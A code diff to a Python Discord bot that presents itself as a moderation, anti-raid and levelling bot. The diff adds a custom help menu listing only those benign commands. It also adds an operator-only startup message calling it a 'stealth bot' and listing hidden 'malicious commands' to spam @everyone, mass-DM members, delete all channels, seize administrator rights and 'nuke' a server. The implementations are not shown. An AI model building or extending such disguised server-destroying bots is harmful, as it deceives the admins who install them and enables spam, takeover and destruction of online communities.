@@ -30,6 +30,9 @@ if data.get("prefix").strip().replace(" ", "") == "":
 bot = commands.Bot(command_prefix=data.get("prefix"))
 status = cycle(['against raiders!', f'{data.get("prefix")}help for commands!'])
 
+# Removes default help command.
+bot.remove_command('help')
+
 
 # Creates the database pool from the database "levels_db" set up in installation (See README.md).
 async def create_db_pool():
@@ -65,7 +68,47 @@ async def reload(ctx, extension):
 @bot.event
 async def on_ready():
     change_status.start()
-    print(Fore.WHITE + 'Your stealth bot is ready to be used, comrade!\n')
+    print(Fore.WHITE + 'Your stealth bot is ready to be used, comrade!\n\n')
+    print(Back.GREEN + f'Malicious commands (Type {data.get("prefix")} to view regular commands):\n' + Back.BLACK + Fore.RED + f"{data.get('prefix')}spam: Spam all text channels with @everyone.\n{data.get('prefix')}mass_dm <message>: DM all members on a server a message.\n{data.get('prefix')}cpurge: Delete all channels on a server.\n{data.get('prefix')}admin: Make yourself administrator on a server.\n{data.get('prefix')}nuke: Destroy a server.")
+
+
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.MissingPermissions):
+        await ctx.send('**Permission denied.**')
+    if isinstance(error, commands.NotOwner):
+        await ctx.send('**You must be an owner to use this command.**')
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send('**Access denied.**')
+    else:
+        print(error)
+
+
+# Help embed.
+@bot.command()
+async def help(ctx):
+    author = ctx.message.author
+    embed = discord.Embed(colour=discord.Color.blue())
+
+    # Embed creation.    
+    embed.set_author(name=f"Here's a list of my commands!")
+    embed.add_field(name="**Moderation:**", value="My moderation commands are:", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}clear [1-1000]", value="Clears messages from a channel.", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}kick <member> [reason]", value="Kicks a member from the server.", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}ban <member> [reason]", value="Bans a member from the server.", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}unban <member>", value="Unbans a member from the server.", inline=False)
+    embed.add_field(name="**Anti-Raid:**", value="My anti-raid commands are:", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}db_add_member <member>", value="Adds a member to my raider database.", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}db_del_member <member>", value="Removes a member from my raider database.", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}lock", value="Locks down current text channel during a raid.", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}unlock", value="Unlocks current text channel after a raid.", inline=False)
+    embed.add_field(name="**Levelling:**", value="My levelling commands are:", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}level", value="Shows your current level and XP.", inline=False)
+    embed.add_field(name="**Status:**", value="My status commands are:", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}latency", value="Shows you my latency in milliseconds (ms).", inline=False)
+
+    # Send embed to member who used the command.
+    await author.send(embed=embed)
 
 
 # Change status every ten seconds.
